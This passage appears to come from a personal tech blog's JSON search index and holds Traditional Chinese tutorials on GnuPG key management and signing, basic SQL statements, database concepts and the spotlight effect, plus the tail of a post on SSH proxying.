123.123.123.123, and port of tunnel is 1234.\nNow, we can take localhost:1234 as a proxy server. (That can forward for our connection to 123.123.123.123:22.)\n","date":"2021/08/29","externalUrl":null,"permalink":"/posts/ssh-proxy/","section":"","summary":"\u003cp\u003eDid you know that SSH can make your host as a proxy server?\u003c/p\u003e","title":"Simply setting up a Proxy Server with SSH","type":"posts"},{"content":"","date":"2021/07/26","externalUrl":null,"permalink":"/categories/psychology/","section":"Categories","summary":"","title":"Psychology","type":"categories"},{"content":"總是覺得別人在說的是自己，他們好像在看我，他們好像在討論我\u0026hellip;\nSpotlight Effect # Spotlight Effect 又稱 聚光燈效應。\n主要描述人們對於自己往往遠比對他人有著更大的焦點。\n當你在拍攝團體照時，看到照片的第一眼是找尋死黨，還是自己？ 小時候當你剪完頭髮，到學校去，結果發現沒人注意到，這是為什麼？ (邊緣) 看著自己上台演講的錄像時，儘管別人表示你表現的很好，但自己仍會將過程中的缺點放大檢視。 這些都可能是 Spotlight Effect 的表現。(過度害怕出錯也可能是因為如此)\n就好比一盞聚光燈打在身上，你認為周遭的人會將目光投放在自己身上，覺得自己的一舉一動受到注目，言行倍受審視。\n即便說這很正常，因為很多人都會對自己有著更高的要求，但當這盞聚光燈太過強烈時，會帶給主角過大的壓力，可能會形成「Glossophobia (公開演講恐懼症)」，嚴重可能會有「Socialphobia (社交恐懼症)」。\n","date":"2021/07/26","externalUrl":null,"permalink":"/posts/spotlight-effect/","section":"","summary":"\u003cp\u003e總是覺得別人在說的是自己，他們好像在看我，他們好像在討論我\u0026hellip;\u003c/p\u003e","title":"Spotlight Effect 聚光燈效應","type":"posts"},{"content":"","date":"2021/07/19","externalUrl":null,"permalink":"/tags/cryptography/","section":"Tags","summary":"","title":"Cryptography","type":"tags"},{"content":"","date":"2021/07/19","externalUrl":null,"permalink":"/series/gnupg/","section":"Series","summary":"","title":"GnuPG","type":"series"},{"content":"用 GnuPG 簽署、驗證、加密、解密 你的檔案及訊息。\nHow to get the keypair? # 可以看看上一篇文章「How to use GnuPG to generate PGP key？」。\nSigning files # 假設要簽章的文件「hello.txt」其內容為：\nHello World! 可以使用該指令來簽署檔案：\n1# gpg --armor --sign --sign-with \u0026lt;Key-ID\u0026gt; \u0026lt;File-Name\u0026gt; 2gpg --armor --sign --sign-with 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 hello.txt 之後會得出簽章後的檔案「hello.txt.asc」\n後綴「.asc」表示此檔案為「ASCII」格式，當然如果你不想要，也可以不使用「--armor, -a」參數。\n--sign 指定要簽章的檔案 (即例子中的檔案 hello.txt)\n--sign-with 指定要簽章的鑰匙，也就是簽章人 (即例子中的金鑰 36EECBC209A936F5AF9B25A469219C5CB53AF7C3)\nP.S.\n「36EECBC209A936F5AF9B25A469219C5CB53AF7C3」為我(簽章者)的 Key ID。 如果不使用「--armor, -a」參數，則預設輸出檔名應該會是「.gpg」後綴，且內容幾乎會是「Non-printing Character」，因此通常建議使用。 你也可以使用上篇文章說到的參數「--output, -o」來輸出自訂的檔名。 至於hello.txt.asc的內容\u0026hellip; 大概長這樣：\n-----BEGIN PGP MESSAGE----- owEB4wEc/pANAwAKAWkhnFy1OvfDAawcYgloZWxsby50eHRg9OQZSGVsbG8gV29y bGQhCokBswQAAQoAHRYhBDbuy8IJqTb1r5slpGkhnFy1OvfDBQJg9OQZAAoJEGkh nFy1OvfD2IwL/2L7GahIvctkXMrzsBp+TG3PqhEzriNuyDagmqtmjuWaxo4dqTZO /iw95YjCMrGthahkDJXi2/wKmA9sy7Z/zUh3GFhKCoATC/Z//nUVKmemtd2ftm9q 2jtO610qOifJyxPhIn3NfXGebeM6Izstgawgg7mdcCh44f3dGn+R9ItIeDfSZ5gb ZJaAVbBxGAXdjjJatJDP/qIXielvQ5fVjay08c99t64iwrnXxklAKgVgQ7SVzPmW SNXjaUcBi3HUVcPn/271VzNivnFxQYQKYm9RORkBqDrtdhiOKOD1bTNZD7RWyR3o AxTeO3kp80y9eUyx6EWMeikyEG8TbNQ2CH6HX+vc1rMLrQkzFSvwbjwT4h1LdYr5 P3uFrhhZ1+BSekeYCW0+xsJ57/1M0lg9Re7JvuH2JIjksG4Vvd3ssCywRGBr1XDH Y2B6PfANptCwg2FiEvW6kRH0+hrxYsNVH2fVyl9DORR9HllYkIeNszEmhgQDqnlK oOJR/GGBNGRHSQ== =j6WE -----END PGP MESSAGE----- 由「-----BEGIN PGP MESSAGE-----」至「-----END PGP MESSAGE-----」中間就是簽章後的訊息。\n並且「-----BEGIN PGP MESSAGE-----」後會空一行 (先不用管，在某些時候會被用來塞資訊)\nVerifying files # 要驗證檔案只需要在擁有該檔案相對應公鑰的情況下，輸入指令：\n1# gpg --verify \u0026lt;File-Name\u0026gt; 2gpg --verify hello.txt.asc 不需要指定解密金鑰嗎？ 正常情況 GunPG 會自動幫你檢測是否有該檔案所對應的金鑰，因此可以不必手動指定。 若是有著相對應金鑰的情況下，應該可以正常驗證該檔案：\n1gpg: Signature made Mon Jul 19 10:31:53 2021 CST 2gpg: using RSA key 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 3gpg: Good signature from \u0026#34;Alpaca0x0 \u0026lt;alpaca0x0@example.com\u0026gt;\u0026#34; [ultimate] 4gpg: WARNING: not a detached signature; file \u0026#39;hello.txt\u0026#39; was NOT verified! 最後一行怎麼有個 WARNING？ 那只是在提醒 GnuPG 所驗證的檔案為簽章過的「hello.txt.asc」而非「hello.txt」，因此提醒你無法確認 hello.txt 是否為原本的檔案。 Detach-Signing # 上述的簽章得出的檔案「hello.txt.asc」是涵蓋原始資訊的，因此你指需要提供該 檔案 及 公鑰，他人便可以驗證並查看內容。\n不過若是你想將簽名及檔案分開存放，那麼可以加上「--detach-sign」參數。\n若是簽章檔案時使用參數「--detach-sign」則表示使用「分離式簽章」：\n1# e.g. 2gpg --armor --detach-sign --sign --sign-with 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 hello.txt 這麼一來，產生出的「hello.txt.asc」檔案僅僅是簽名，而不包含原始檔案的內容，因此你必須將公鑰、原始檔案、簽名一並提供，他人才能驗證及查看。\n1gpg: assuming signed data in \u0026#39;hello.txt\u0026#39; 2gpg: Signature made Mon Jul 19 11:04:55 2021 CST 3gpg: using RSA key 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 4gpg: Good signature from \u0026#34;Alpaca0x0 \u0026lt;alpaca0x0@example.com\u0026gt;\u0026#34; [ultimate] 也可以注意到底下不會出現「gpg: WARNING: not a detached signature; file 'hello.txt' was NOT verified!」的訊息了，因為這時候的「hello.txt」是受到「hello.txt.asc」認證過的檔案，可以確保沒有受到竄改。\nDecrypting files # 上述的都是簽章及驗證，若是要查看內容則需要用到解密指令：\n1# gpg --decrypt \u0026lt;File-Name\u0026gt; 2gpg --decrypt hello.txt.asc 與「--verify」一樣，不需要指定解密公鑰\n若是有對應的公鑰，就可以看到內容及簽章資訊了：\n1Hello World! 2gpg: Signature made Mon Jul 19 12:30:52 2021 CST 3gpg: using RSA key 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 4gpg: Good signature from \u0026#34;Alpaca0x0 \u0026lt;alpaca0x0@example.com\u0026gt;\u0026#34; [ultimate] 當然也可以將結果輸出到指定檔案：\n1# gpg --output \u0026lt;Output-File-Name\u0026gt; --decrypt \u0026lt;Input-File-Name\u0026gt; 2# gpg --decrypt \u0026lt;Input-File-Name\u0026gt; \u0026gt; \u0026lt;Output-File-Name\u0026gt; 3gpg --output hello.txt.dec --decrypt hello.txt.asc 4# or 5gpg --decrypt hello.txt.asc Encrypting # What is the difference between --encrypt and --sign? --encrypt - The contents will are NOT able to be seen without have the corresponding key. (Typically used to deliver private content to a specific target) --sign - Everyone can see the contents, but only with the corresponding key can verify that the file has not been tampered with. (Usually used for some official announcements) 1# gpg --armor --encrypt --recipient \u0026lt;Key-ID\u0026gt; \u0026lt;File-Name\u0026gt; 2gpg --armor --encrypt --recipient 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 hello.txt p.s. 參數「--recipient, -r」為指定對象，如例子中指定要執行encrypt的公鑰，即「36EECBC209A936F5AF9B25A469219C5CB53AF7C3」。\nSign and Encrypt # 在使用「--sign」簽名時，可以搭配「--encrypt」使用。\n若我要將檔案「hello.txt」簽名，並且我希望僅能由我的好友 Bob 接收該檔案，因此我使用 Bob 提供給我的公鑰「CEE24977933B19A42EEA8CB96DC577B036FDDE87」來將簽名後的檔案加密：\n1# gpg --armor --sign --encrypt --sign-with \u0026lt;Your-Private-Key-ID\u0026gt; --recipient \u0026lt;Recipient-Public-Key-ID\u0026gt; --encrypt \u0026lt;File-Name\u0026gt; 2gpg --armor --sign --sign-with 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 --recipient CEE24977933B19A42EEA8CB96DC577B036FDDE87 hello.txt 則檔案「hello.txt.asc」僅能讓同時擁有 我的公鑰 及 Bob 的私鑰 兩把鑰匙的人解密。\np.s. 用「--recipient, -r」參數來指定--encrypt的對象，也就是欲用來加密的公鑰。\nReferences # 《GnuPG documentation》https://gnupg.org/documentation/manpage.html\n","date":"2021/07/19","externalUrl":null,"permalink":"/posts/gnupg-signing-files-and-messages/","section":"","summary":"\u003cp\u003e用 GnuPG 簽署、驗證、加密、解密 你的檔案及訊息。\u003c/p\u003e","title":"How to use GnuPG to sign files and messages？","type":"posts"},{"content":"","date":"2021/07/19","externalUrl":null,"permalink":"/tags/pgp/","section":"Tags","summary":"","title":"PGP","type":"tags"},{"content":"怎麼使用 GnuPG 生成 PGP 金鑰？\nWhat is GnuPG？ # GNU Privacy Guard 簡稱 GnuPG、GPG，主要是用於數位加密、簽章的軟體。(Asymmetric cryptography 金鑰的管理)\n更詳細介紹請見《Wiki 維基百科 - GnuPG》\nInstall # Ubuntu\n1apt-get install gnupg2 2# OR 3apt-get install gnupg Mac\n1brew install gnupg Generating a new keypair # 如果你想簡單快速的生成金鑰，可以使用指令： 1gpg --gen-key 想手動選擇更完整的選項可以使用指令： 1gpg --full-gen-key 如果是 --full-gen-key 則會顯示：\n1Please select what kind of key you want: 2 (1) RSA and RSA (default) 3 (2) DSA and Elgamal 4 (3) DSA (sign only) 5 (4) RSA (sign only) 6 (14) Existing key from card 7Your selection? 輸入數字選擇自己要的加密演算法類型，或者直接按下 Enter 使用預設。\n接著是輸入金鑰的長度及金鑰時效設定：\n1RSA keys may be between 1024 and 4096 bits long. 2What keysize do you want? (3072) # 輸入金鑰位元長度，1024 ～ 4096 之間 3Requested keysize is 3072 bits 1Please specify how long the key should be valid. 2 0 = key does not expire 3 \u0026lt;n\u0026gt; = key expires in n days 4 \u0026lt;n\u0026gt;w = key expires in n weeks 5 \u0026lt;n\u0026gt;m = key expires in n months 6 \u0026lt;n\u0026gt;y = key expires in n years 7Key is valid for? (0) # 選擇金鑰過期設定 8Key does not expire at all 9Is this correct? (y/N) y # 輸入「y」確認 接著就是輸入主要的資訊了 (使用 --gen-key 參數會直接跳到這)\n1# Terminal 2Real name: Alpaca0x0 # 你的名稱 3Email address: alpaca0x0@example.com # 你的 Email 4Comment: My First PGP Key. # 註釋 (使用 full-gen-key 參數才會顯示) 最後確認資訊\n若有誤可以輸入「N」修改名稱，輸入「E」修改 Email。\n輸入「O」進行確認\n1You selected this USER-ID: 2 \u0026#34;Alpaca0x0 \u0026lt;alpaca0x0@example.com\u0026gt;\u0026#34; 3 4Change (N)ame, (E)mail, or (O)kay/(Q)uit? O 之後會要求你輸入密碼，可以設定也可以留空。\n完成後會顯示該金鑰的資訊：\n1pub rsa3072 2021-07-16 [SC] [expires: 2023-07-16] 2 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 3uid Alpaca0x0 \u0026lt;alpaca0x0@example.com\u0026gt; 4sub rsa3072 2021-07-16 [E] [expires: 2023-07-16] 「rsa3072」指的是「RSA」算法，金鑰長度「3072」位元 「36EECBC209A936F5AF9B25A469219C5CB53AF7C3」就是 Key ID Displaying keys # Displaying public keys # 要查看已有的公鑰，使用指令：\n1gpg --list-public-keys 2# OR 3gpg --list-keys 4# OR 5gpg -k 顯示已有的公鑰：\n1pub rsa3072 2021-07-16 [SC] [expires: 2023-07-16] 2 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 3uid [ultimate] Alpaca0x0 \u0026lt;alpaca0x0@example.com\u0026gt; 4sub rsa3072 2021-07-16 [E] [expires: 2023-07-16] 也可以在後方加上關鍵字 (名稱、Email)：\n1# gpg --list-keys \u0026lt;Keyword\u0026gt; 2gpg --list-keys alpaca0x0 3# OR 4gpg --list-keys alpaca 5# OR 6gpg --list-keys example.com Displaying secret keys # 查看已有的私鑰，使用指令：\n1gpg --list-secret-keys 與 --list-public-keys 用法類似，一樣可以加入關鍵字查詢：\n1# gpg --list-secret-keys \u0026lt;Keyword\u0026gt; 2gpg --list-secret-keys alpaca0x0 Exporting key # Exporting public key # 若要導出公鑰，則使用指令：\n1gpg --export \u0026lt;Key-ID\u0026gt; 但這樣導出的密鑰是 binary format，所以使用參數「--armor, -a」來使其輸出為 ASCII-Code format。\n使用「--output, -o」或者「\u0026gt;」將輸出結果寫入檔案：\n1# gpg --export --armor \u0026lt;Key-ID\u0026gt; \u0026gt; \u0026lt;Output-File-Name\u0026gt; 2# gpg --export --armor --output \u0026lt;Output-File-Name\u0026gt; \u0026lt;Key-ID\u0026gt; 3gpg --export --armor --output public_key.pub 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 4# OR 5gpg --export --armor 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 \u0026gt; public_key.pub Exporting secret key # 導出私鑰使用指令：\ngpg --export-secret-keys \u0026lt;Key-ID\u0026gt; 與 --export 用法相同\np.s. 若是當初生成鑰匙時有輸入密碼，則導出時也需要輸入驗證。\n1# e.g. 2gpg --export-secret-keys --armor 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 \u0026gt; secret_key.asc Sending the key to the key server # 公鑰可以上傳至公開的 Keyserver 上讓他人能方便下載你的公鑰。\n上傳的指令是：\n1gpg --send-keys 0x\u0026lt;Key-ID\u0026gt; 2# 可以使用「--keyserver」參數指定上傳的伺服器 3gpg --send-keys --keyserver \u0026lt;Server\u0026gt; 0x\u0026lt;Key-ID\u0026gt; 這邊要特別注意的是，大多數時候，在 \u0026lt;Key-ID\u0026gt; 的前方要加上「0x」(Hexadecimal)。\n1# e.g. 2gpg --send-keys --keyserver pgp.mit.edu 0x36EECBC209A936F5AF9B25A469219C5CB53AF7C3 Deleting key # 刪除本地的公鑰，使用指令：\n1# gpg --delete-key \u0026lt;Key-ID\u0026gt; 2gpg --delete-keys 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 但當我們執行時，會發現終端返回這則訊息：\n1gpg: there is a secret key for public key \u0026#34;36EECBC209A936F5AF9B25A469219C5CB53AF7C3\u0026#34;! 2gpg: use option \u0026#34;--delete-secret-keys\u0026#34; to delete it first. 這是因為你還留有該公鑰的私鑰，所以先刪除私鑰，再刪除公鑰：\n1# Delete secret keys 2gpg --delete-secret-keys \u0026lt;Key-ID\u0026gt; 3# Delete public keys 4gpg --delete-keys \u0026lt;Key-ID\u0026gt; 1# e.g. 2gpg --delete-secret-keys 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 3gpg --delete-keys 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 或者使用「--delete-secret-and-public-keys」一次刪除公私鑰：\n1# gpg --delete-secret-and-public-keys \u0026lt;Key-ID\u0026gt; 2gpg --delete-secret-and-public-keys 36EECBC209A936F5AF9B25A469219C5CB53AF7C3 Importing key # 要匯入金鑰主要有兩種方式\n從檔案匯入(本地端匯入)：\n1# gpg --import \u0026lt;Key-File\u0026gt; 2gpg --import Private_OR_Public.key 從 Key-Server 上匯入(遠端匯入)：\n1# gpg --keyserver \u0026lt;Server\u0026gt; --recv-key 0x\u0026lt;Key-ID\u0026gt; 2gpg --keyserver keyserver.ubuntu.com --recv-key 0xA91A9E8A0EE6BAB3742464861DF369D42499F3F1 如果要查詢該 Key-Server 上的鑰匙資訊，可以使用指令：\n1# gpg --keyserver \u0026lt;Server\u0026gt; --search-key \u0026lt;Key-ID\u0026gt; 2gpg --keyserver keyserver.ubuntu.com --search-key 0xA91A9E8A0EE6BAB3742464861DF369D42499F3F1 References # 《GnuPG documentation》https://gnupg.org/documentation/manpage.html\n","date":"2021/07/16","externalUrl":null,"permalink":"/posts/gnupg-generating-pgp-key/","section":"","summary":"\u003cp\u003e怎麼使用 GnuPG 生成 PGP 金鑰？\u003c/p\u003e","title":"How to use GnuPG to generate PGP key？","type":"posts"},{"content":"一些基礎常見的 SQL 語法。\n示範的資料 # 目前資料表內有以下資料：\nid phone name age 1 0123456789 新之助 5 2 NULL Anonymous 19 3 NULL 向日葵 0 4 0111222333 美冴 29 5 0444555666 廣志 35 如果可以的話也試著一起做做看。\n修改 # 修改資料筆 # 修改資料筆需要使用「UPDATE」語法：\n1UPDATE `資料表名稱` 2SET `欄位1` = 欄位1新的值, `欄位2` = 欄位2新的值... 3WHERE 修改條件; 範例 - 修改資料筆 # 輸入語法：\n1UPDATE `資料表名稱` 2SET `name` = \u0026#34;小白\u0026#34;, `age` = 0 3WHERE `name` LIKE \u0026#39;%onym%\u0026#39;; 原資料：\nid phone name age 2 NULL Anonymous 19 被更改為：\nid phone name age 2 NULL 小白 0 條件「`name` LIKE '%onym%'」表示模糊查詢 name 欄位「含有 \u0026quot;onym\u0026quot;」的資料筆。\nps. 若沒有寫 WHERE 條件，則會更改所有資料。\n所有資料的欄位 name 會變「小白」，欄位 age 會變「0」\u0026hellip;\n修改欄位 # 新增欄位 # 1ALTER TABLE `資料表名稱` ADD COLUMN `欄位名稱` 資料型態(長度) 屬性1 屬性2...; 範例 - 新增欄位 # 1ALTER TABLE `資料表名稱` ADD COLUMN `jp_name` varchar(20) NULL; 資料表欄位多出「jp_name」：\nid phone name age jp_name 1 0123456789 新之助 5 NULL 2 NULL 小白 0 NULL 3 NULL 向日葵 0 NULL 4 0111222333 美冴 29 NULL 5 0444555666 廣志 35 NULL 修改欄位 # 1ALTER TABLE `資料表名稱` CHANGE COLUMN `舊欄位名稱` 2`新欄位名稱` 新資料形態(長度) 屬性1 屬性2...; 範例 - 修改欄位 # 1ALTER TABLE `資料表名稱` CHANGE COLUMN `phone` 2`phone` varchar(11) NULL; 則資料欄位 phone 由型態「char(10)」更改至「varchar(11)」。\n刪除欄位 # 1ALTER TABLE `資料表名稱` DROP COLUMN `欄位名稱`; 範例 - 刪除欄位 # 1ALTER TABLE `資料表名稱` DROP COLUMN `age`; 欄位「age」被刪除了：\nid phone name jp_name 1 0123456789 新之助 NULL 2 NULL 小白 NULL 3 NULL 向日葵 NULL 4 0111222333 美冴 NULL 5 0444555666 廣志 NULL 刪除 # 刪除資料筆 # 刪除資料筆使用的語法為「DELETE」：\n1DELETE FROM `資料表名稱` WHERE 刪除條件 範例 - 刪除資料筆 # 1DELETE FROM `資料表名稱` WHERE `phone` IS NULL ps. 「IS NULL」這個寫法表示比對值為 NULL (空值)，等同於「`phone` = \u0026quot;\u0026quot;」。\n原資料為：\nid phone name jp_name 1 0123456789 新之助 NULL 2 NULL 小白 NULL 3 NULL 向日葵 NULL 4 0111222333 美冴 NULL 5 0444555666 廣志 NULL 刪除後：\nid phone name jp_name 1 0123456789 新之助 NULL 4 0111222333 美冴 NULL 5 0444555666 廣志 NULL 當然，如同 UPDATE 語法一樣，沒有指定 WHERE 刪除條件，則會刪除全部！\n刪除資料表 # 刪除資料表使用的是「DROP」語法：\n1DROP TABLE `資料表名稱`; 刪除資料庫 # 刪除資料庫一樣使用「DROP」語法：\n1DROP DATABASE `資料庫名稱`; ","date":"2021/05/25","externalUrl":null,"permalink":"/posts/sql-basic-03/","section":"","summary":"\u003cp\u003e一些基礎常見的 SQL 語法。\u003c/p\u003e","title":"《SQL Basics-03》UPDATE、ALTER、DROP","type":"posts"},{"content":"","date":"2021/05/25","externalUrl":null,"permalink":"/tags/database/","section":"Tags","summary":"","title":"Database","type":"tags"},{"content":"一些基礎常見的 SQL 語法。\n查詢 # 要在資料表內查詢資料筆，則需要用到「SELECT」語法：\n1SELECT `查詢欄位1`,`查詢欄位2...` FROM `資料表名稱` WHERE 查詢條件; 而查詢的欄位也可以填入「*」來表示查詢「全部欄位」：\n1SELECT * FROM `資料表名稱 WHERE `查詢條件`; 至於條件\u0026hellip; 各種寫法，常見的寫法為 比對資料值相符與否。\n範例 - 比對數字 # 利用上一篇文章「《SQL Basics-01》CREATE、INSERT」中所說的語法，陸續寫入幾筆資料後，目前的資料表內容為：\nid phone name age 1 0123456789 新之助 5 2 NULL Anonymous 19 3 NULL 向日葵 0 4 0111222333 美冴 29 5 0444555666 廣志 35 輸入查詢語法：\n1SELECT `id`, `name`, `age` FROM `資料表名稱` WHERE `age` \u0026gt; 10; Database Server 返回以下結果：\nname age Anonymous 19 美冴 29 廣志 35 因為 WHERE 後方所寫的查詢條件為「age」的值須大於「10」，\n因此 age 小於等於 10 的資料筆將不顯示。\n大於使用「\u0026gt;」；小於使用「\u0026lt;」；\n等於使用「=」；不等於使用「!=」或「\u0026lt;\u0026gt;」；\n大於等於使用「\u0026gt;=」；小於等於使用「\u0026lt;=」；\nps. 若不指定查詢條件，則表示查詢全部：\n1SELECT `id`, `name`, `age` FROM `資料表名稱`; Database Server 返回以下結果：\nid name age 1 新之助 5 2 Anonymous 19 3 向日葵 0 4 美冴 29 5 廣志 35 範例 - 比對字串 # 輸入查詢語法：\n1SELECT `id`, `name` FROM `資料表名稱` WHERE `name` = \u0026#34;新之助\u0026#34;; Database Server 返回以下結果：\nid name 1 新之助 不等於的字串查詢：\n1SELECT `id`, `name` FROM `資料表名稱` WHERE `name` != \u0026#34;Anonymous\u0026#34;; Database Server 返回以下結果：\nid name 1 新之助 3 向日葵 4 美冴 5 廣志 範例 - 模糊比對 # 當有時候我們不確定目標欄位的值時，我們可以用部份特徵來比對。\n要模糊查詢則是使用「LIKE」語法：\n1SELECT * FROM `資料表名稱` WHERE `phone` LIKE \u0026#34;01%\u0026#34;; Database Server 返回以下結果：\nid phone name age 1 0123456789 新之助 5 4 0111222333 美冴 29 百分號「%」表示任意字元比對 0 次或 0 次以上。\n該語法的意思是，查詢 phone 的值為 01 開頭 的資料筆。\n所以假設「蘋果%」可以配對「蘋果」、「蘋果汁」、「蘋果派不好吃」，但不能配對「青蘋果」，因為「青蘋果」開頭並非是「蘋果」，若要配對它，則可以寫成「%蘋果%」。\n如果輸入以下語法：\n1SELECT * FROM `資料表名稱` WHERE `age` LIKE \u0026#34;_9\u0026#34;; Database Server 返回以下結果：\nid phone name age 2 NULL Anonymous 19 4 0111222333 美冴 29 底線「_」表示任意字元比對 1 次。\n該語法表示，查詢 age 欄位「第二字為 9」的結果。\n所以「_9」可以配對「39」、「59」但不能配對「22」、「9」，當然也不能配對「193」，如果要配對「193」則須寫做「_9_」或者「_9%」。\n","date":"2021/05/25","externalUrl":null,"permalink":"/posts/sql-basic-02/","section":"","summary":"\u003cp\u003e一些基礎常見的 SQL 語法。\u003c/p\u003e","title":"《SQL Basics-02》SELECT、LIKE","type":"posts"},{"content":"一些基礎常見的 SQL 語法。\n創建 # 創建資料庫 # 創建使用的是「CREATE」語法：\n1CREATE DATABASE `資料庫名稱`; 創建資料表及欄位 # 由於要先指定資料庫才能使用裡面的資料表，所以先選擇資料庫：\n1USE `資料庫名稱`; 之後創建資料表，創建格式如下：\n1CREATE TABLE `資料表名稱`( 2\t`欄位1名稱` 資料型態(長度) 屬性1 屬性2..., 3\t`欄位2名稱` 資料型態(長度) 屬性1 屬性2..., 4\t... 5); 範例 # 1CREATE TABLE `資料表名稱`( 2\t`id` int AUTO_INCREMENT PRIMARY KEY, 3\t`phone` char(10), 4\t`name` varchar(20) DEFAULT \u0026#39;Anonymous\u0026#39;, 5\t`age` int(3) NOT NULL 6); 語法說明 # 欄位格式為「欄位名稱 資料類別(長度) 屬性1 屬性2...」。每筆資料以「,」區隔。\n欄位「id」為「int」表示「整數」，範圍為「-2,147,483,648 ~ 2,147,483,647」。\n屬性 「PRIMARY KEY」則表示 主鍵，同時加上「AUTO_INCREMENT」使其能在新增一筆新資料時，自動累加 id 以確保資料筆之間的 id 值唯一。\n欄位「phone」為「char」表示「字元」，最大字元長度為「255」。在後方有「(10)」則限制其長度為 10 。(ps. 若長度不足 10 則會自動補足 10，總之在儲存上佔用的容量是固定的)\n而「name」欄位同樣是字元，但寫作「varchar」，最大字元長度為「65535」，差別在於資料儲存上，varchar(20)指的是若字元長度不足 20 ，則只會佔用資料的字元長度大小，相較於「char」更為彈性，通常建議使用這個類別而非「char」。\n屬性「DEFAULT」意思為「預設」。在新增資料筆時，若沒有指定該欄位的情況下，會自動寫入預設值，舉上述例子，當沒有指定「name」欄位寫入時，該欄位將自動寫入「Anonymous」。\n最後的「age」欄位屬性「NOT NULL」表示該欄位不能為空值。\n若要表示該資料可以為空，則使用「NULL」屬性。\n若沒有特別指定，則使用系統預設，通常為「NULL」屬性。\n(ps. id 雖然沒有該屬性，但 PRIMARY KEY 屬性本身就自帶 NOT NULL 了)\n另外，你也可以將欄位格式寫好後，在最後才將其定義為主鍵：\n1CREATE TABLE `資料表名稱` ( 2\t`id` int AUTO_INCREMENT, 3\t... 4\tPRIMARY KEY(`id`) 5); 新增 # 想要在資料表內新增資料筆，則需要用到「INSERT」語法：\n1INSERT INTO `資料表名稱`(`欄位1`, `欄位2`,...) 2VALUES (欄位1的值, 欄位2的值...); 填寫值的順序是對應前面欄位順序的。\n這邊要特別注意的是，兩行之間並沒有「,」或「;」區隔。\n本質上它算是一行，只是為了提高可讀性，所以習慣寫作兩行或以上。\n(ps. 另外，舉上述例子，我們不需要在新增時手動寫入「id」欄位，因為「AUTO_INCREMENT」會自動寫入。)\n範例 # 舉上述創建例子中的資料表為例：\n1INSERT INTO `資料表名稱`(`phone`, `name`, `age`) 2VALUES (\u0026#34;0123456789\u0026#34;, \u0026#34;新之助\u0026#34;, 5); 會寫入以下資料：\nid phone name age 1 0123456789 新之助 5 再寫入一筆，但這次只指定必要的欄位「age」：\n1INSERT INTO `資料表名稱`(`age`) 2VALUES (19); 目前資料為：\nid phone name age 1 0123456789 新之助 5 2 NULL Anonymous 19 由於 id 欄位的「AUTO_INCREMENT」屬性，所以自動累加上一筆資料的 id。 欄位 phone 並未指定，而又不存在預設值，因此為NULL (空值)。 欄位 name 並未指定，但存在預設值「Anonymous」，因此寫入預設值。 欄位 age 指定為 19 。 但如果這麼寫：\n1INSERT INTO `資料表名稱`(`name`, `phone`) 2VALUES (\u0026#34;小葵\u0026#34;, \u0026#34;0987654321\u0026#34;); 會發生什麼事情？\n答案是噴一個錯誤 - Field 'age' doesn't have a default value\n還記得剛剛創建資料表時，設置了 age 欄位為「NOT NULL」屬性嗎？\n而在此並未給予 age 值，而 age 又不存在「DEFAULT」預設值，因此出錯。\n","date":"2021/05/25","externalUrl":null,"permalink":"/posts/sql-basic-01/","section":"","summary":"\u003cp\u003e一些基礎常見的 SQL 語法。\u003c/p\u003e","title":"《SQL Basics-01》CREATE、INSERT","type":"posts"},{"content":"資料庫早已被大量使用，如果還分不清楚 Database 與 DBMS 及 SQL 的關係，那還真是場災難呢！\nDatabase (資料庫) # Database (資料庫) 簡稱「DB」。就如同名稱般，是存放資料的地方。\n如果放在傳統的「資料庫」來說，可以單指堆滿文件的倉庫，或者一間圖書館。\n但在現今所聽到的「資料庫」多半是指「數位化」的資料庫，存放在計算機上的。\n是否有想過，你在網站上的帳號、密碼，或者社群上的圖片、貼文等，這些資料是存放在哪裡？這麼一想就不難發現 Database 的重要性！\nDBMS (資料庫管理系統) # 「DBMS」全名「Database Management System」，中文為「資料庫管理系統」。\n存放多筆數據的資料庫，不易被管理。\n設想一下若圖書館內沒有電腦的管理系統協助查詢，要找一本書需要花多久的時間？\n但有了管理系統，你只需要到櫃台請工作人員查詢書名，便可以在短短幾秒內知道這本書的作者、出版日期\u0026hellip;等資訊，另外也可以知道這本書在該圖書館的數量、類別、位置等。\n而上述這一切僅發生在工作人員按下執行查詢工作的一瞬間。\n這就是 DBMS (資料庫管理系統) 的效率。\n當前常見的 DBMS 有 MySQL、Oracle Database、Microsoft Access、Microsoft SQL Server、MariaDB、SQLite、IBM DB2、PostgreSQL、MongoDB 等。\n什麼是 SQL (結構化查詢語言) ？ # 「SQL」全名「Structured Query Language」，中文為「結構化查詢語言」。\n用來操作 DBMS 的查詢語言。\n不過稍微科普一下，通常 SQL 語法是寫在程式碼中，使程式可以自動化發送請求。\n在企業中較少提供管理員手動輸入 SQL 語法查詢的情境，因為人為失誤可能導致嚴重的後果。(通常是提供後台管理的操作頁面操作 Database)\n統整 # 為了方便了解，我製作了這張圖給各位參考：\nSQL、DBMS、DB 之間的關係 參考資料 # 《Wiki 維基百科 - SQL》https://zh.wikipedia.org/wiki/SQL\n《Wiki 維基百科 - 資料庫管理系統》https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F\n《Wiki 維基百科 - SQL語法》https://zh.wikipedia.org/wiki/SQL%E8%AF%AD%E6%B3%95\n","date":"2021/05/22","externalUrl":null,"permalink":"/posts/db-dbms-sql/","section":"","summary":"\u003cp\u003e資料庫早已被大量使用，如果還分不清楚 Database 與 DBMS 及 SQL 的關係，那還真是場災難呢！\u003c/p\u003e","title":"資料庫概念 DB、DBMS、SQL 